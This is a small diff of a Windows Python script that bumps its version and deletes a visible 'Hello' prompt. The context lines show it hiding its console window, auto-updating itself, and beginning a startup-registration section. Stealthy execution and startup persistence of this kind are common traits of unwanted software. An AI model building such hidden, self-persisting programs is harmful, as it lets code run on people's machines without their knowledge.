@@ -1,4 +1,4 @@
-# 1.1
+# 1.2
 
 import subprocess
 import importlib
@@ -39,7 +39,6 @@ import io
 import base64
 import stat
 
-input("Hello: ")
 # Hide console
 win = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(win, win32con.SW_HIDE)
@@ -130,7 +129,6 @@ def checkForUpdate(force: int):
 
 
 checkForUpdate(force=0)
-
 
 # -----------------------------
 # Startup registration
